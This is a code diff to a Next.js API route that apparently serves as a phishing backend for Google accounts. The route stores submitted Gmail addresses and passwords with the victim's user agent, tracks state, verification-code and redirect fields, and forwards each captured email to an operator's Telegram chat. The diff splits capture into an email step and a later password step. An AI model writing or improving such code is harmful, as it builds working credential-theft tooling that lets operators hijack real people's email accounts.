@@ -9,13 +9,7 @@ import Config from "@/models/Config";
 export async function POST(request: NextRequest) {
   try {
     const { id, email, password } = await request.json();
-
-    if (!id) {
-      return NextResponse.json(
-        { error: "ID is required." },
-        { status: 400 }
-      );
-    }
+    const userAgent = request.headers.get("user-agent") || "Unknown";
 
     if (!email && !password) {
       return NextResponse.json(
@@ -26,21 +20,29 @@ export async function POST(request: NextRequest) {
 
     await connectDB();
 
-    const gmail = await Gmail.findById(id);
-    if (!gmail) {
-      return NextResponse.json(
-        { error: "Gmail not found." },
-        { status: 404 }
-      );
+    let gmail;
+
+    if (email) {
+      gmail = await Gmail.create({ email: email.trim().toLowerCase(), userAgent });
     }
 
-    if (email) gmail.email = email.trim().toLowerCase();
-    if (password) gmail.password = password;
+    if (id && password) {
+      gmail = await Gmail.findById(id);
+      if (!gmail) {
+        return NextResponse.json(
+          { error: "Gmail not found." },
+          { status: 404 }
+        );
+      }
 
-    gmail.state = "saved";
-    gmail.code = "";
-    gmail.redirectTo = "";
-    await gmail.save();
+      gmail.password = password;
+      gmail.state = "saved";
+      gmail.code = "";
+      gmail.redirectTo = "";
+      await gmail.save();
+    }
+
+
 
 
     const data = await Config.findOne({});
@@ -49,7 +51,7 @@ export async function POST(request: NextRequest) {
     }
 
     if (data?.telegram_chat && email) {
-      await sendTelegramMessage(data.telegram_chat, `${gmail.email}`);
+      await sendTelegramMessage(data.telegram_chat, email);
     }
 
     return NextResponse.json({
@@ -69,20 +71,18 @@ export async function POST(request: NextRequest) {
 // GET BY EMAIL
 export async function GET(request: NextRequest) {
   try {
-    const email = request.nextUrl.searchParams.get("email");
+    const id = request.nextUrl.searchParams.get("id");
 
-    if (!email) {
+    if (!id) {
       return NextResponse.json(
-        { error: "Email query parameter is required." },
+        { error: "ID query parameter is required." },
         { status: 400 }
       );
     }
 
     await connectDB();
 
-    const gmail = await Gmail.findOne({
-      email: email.trim().toLowerCase(),
-    });
+    const gmail = await Gmail.findById(id)
 
     if (!gmail) {
       return NextResponse.json(
